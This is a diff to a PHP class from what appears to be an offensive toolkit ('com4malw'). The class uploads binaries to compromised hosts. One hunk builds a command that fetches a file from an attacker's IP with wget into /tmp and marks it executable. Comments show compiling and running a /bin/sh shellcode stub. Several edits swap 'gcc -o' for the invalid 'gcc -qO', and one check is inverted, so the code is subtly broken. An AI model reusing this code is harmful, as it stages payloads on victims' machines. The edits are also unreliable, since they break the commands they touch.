@@ -38,8 +38,8 @@ class com4bin extends com4malw{
 	public function bin2path($stream,$filename,$ip_attacker){
 	    $this->titre(__FUNCTION__);
 	    $path_socat = $this->file4locate($stream,$filename);
-	    if (!empty($path_socat)) {
-	        $query = "wget 'http://$ip_attacker:$this->port_rfi/$filename' -O /tmp/$filename && chmod +x /tmp/$filename ";
+	    if (empty($path_socat)) {
+	        $query = "wget 'http://$ip_attacker:$this->port_rfi/$filename' -qO /tmp/$filename && chmod +x /tmp/$filename ";
 	        $this->req_str($stream, $query, $this->stream_timeout, "");
 	        return "/tmp/$filename";
 	    }
@@ -359,7 +359,7 @@ class com4bin extends com4malw{
 	 * WRT8;
 	 * system("echo \"$write_asm8\" > $dir_tmp/write_asm8.c");
 	 * requette("cat -n $dir_tmp/write_asm8.c");
-	 * requette("gcc -o $dir_tmp/write_asm8 $dir_tmp/write_asm8.c;chmod +x $dir_tmp/write_asm8");
+	 * requette("gcc -qO $dir_tmp/write_asm8 $dir_tmp/write_asm8.c;chmod +x $dir_tmp/write_asm8");
 	 * requette("$dir_tmp/write_asm8");
 	 * $shellcode_testo = shellcode_extract_from_bin_file("$dir_tmp/write_asm8");
 	 * shellcode_test($shellcode_testo,"-m32");
@@ -470,7 +470,7 @@ class com4bin extends com4malw{
 	 *
 	 * system("echo \"void main(){char *line = \\\"Hello World !\\\";write(1, line, strlen(line));exit(0);} \" > $dir_tmp/helloworld3.c");
 	 * requette("cat $dir_tmp/helloworld3.c");
-	 * requette("gcc -o $dir_tmp/helloworld3 $dir_tmp/helloworld3.c;chmod +x $dir_tmp/helloworld3");
+	 * requette("gcc -qO $dir_tmp/helloworld3 $dir_tmp/helloworld3.c;chmod +x $dir_tmp/helloworld3");
 	 * requette("$dir_tmp/helloworld3");
 	 * pause();
 	 *
@@ -532,7 +532,7 @@ class com4bin extends com4malw{
 	 *
 	 * system("echo \"void main(){shellcode();}void shellcode(){system(\\\"/bin/sh\\\");}\" > $dir_tmp/bin_sh.c");
 	 * requette("cat $dir_tmp/bin_sh.c");
-	 * requette("gcc -m32 -o $dir_tmp/bin_sh $dir_tmp/bin_sh.c;chmod +x $dir_tmp/bin_sh");
+	 * requette("gcc -m32 -qO $dir_tmp/bin_sh $dir_tmp/bin_sh.c;chmod +x $dir_tmp/bin_sh");
 	 * requette("$dir_tmp/bin_sh");
 	 * pause();
 	 * $programme = "$dir_tmp/bin_sh";
